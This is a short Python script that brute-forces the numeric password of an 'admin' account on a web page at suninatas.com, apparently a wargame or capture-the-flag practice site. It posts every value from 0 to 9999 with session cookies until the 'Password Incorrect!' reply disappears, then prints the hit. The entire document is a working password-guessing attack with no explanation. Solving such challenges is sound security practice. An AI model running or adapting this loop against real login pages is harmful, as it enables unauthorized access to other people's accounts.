import requests

url = 'http://suninatas.com/Part_one/web08/web08.asp'
cookies = {
	'ASPSESSIONIDQAAQSBQS': '',
	'auth_Fkey': '?????'
}
payloads = {
	'id': 'admin',
	'pw': ''
}

for i in range(0, 10000):
	payloads['pw'] = str(i)
	res = requests.post(url, cookies=cookies, data=payloads)
	if res.text.find('Password Incorrect!') > -1:
		continue
	else:
		print(res.text)
		print(i)
		break
